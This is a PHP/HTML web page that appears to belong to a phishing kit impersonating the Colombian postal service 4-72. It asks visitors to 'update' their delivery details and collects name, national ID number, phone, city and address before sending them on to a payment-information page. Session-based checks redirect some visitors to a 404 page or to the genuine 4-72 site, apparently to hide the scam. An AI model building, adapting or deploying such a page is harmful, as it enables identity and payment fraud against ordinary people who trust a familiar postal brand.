<?php


session_start();

if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){


}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 2){

    header('location:/404.php');

}else if(isset($_SESSION['estado']) && $_SESSION['estado'] == 3){

    header('location:https://www.4-72.com.co/publicaciones/236/personas/');
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Actualizar datos</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">


    <link rel="stylesheet" href="css/style.css">
</head>
<body>

<center><br><br><img src="img/logo.jpeg" alt="" srcset="" width="50%"></center>

<br><br>
<center><h1>Actualizar datos</h1></center>
<form action="/informacion_pago.php" method="post" required>
    <center><input type="text" placeholder="Nombre" name="nombre" id="input_contacto" required>
    <input type="text" placeholder="Apellido" name="apellido" id="input_contacto" required>
    <input type="tel" placeholder="Cedula de ciudadania" name="cedula" id="input_contacto" required maxlength="10" minlength="8">
    <input type="tel" placeholder="Telefono de contacto" name="telefono" id="input_contacto" required minlength="10" maxlength="10">
    <input type="text" placeholder="Ciudad de entrega" name="ciudad" id="input_contacto" required>
    <input type="text" placeholder="Dirección de entrega" name="direccion" id="input_contacto" required>
<br>
    <br><br><input type="submit" value="Continuar" id="btn" name="actualizar_datos"><br><br>
</center>


</form>
<br>
<div class="footer" style="position:absolute; bottom:100;">
    <img src="/img/footer.jpg" alt="" srcset="" width="100%">
    </div>
    
</body>
</html>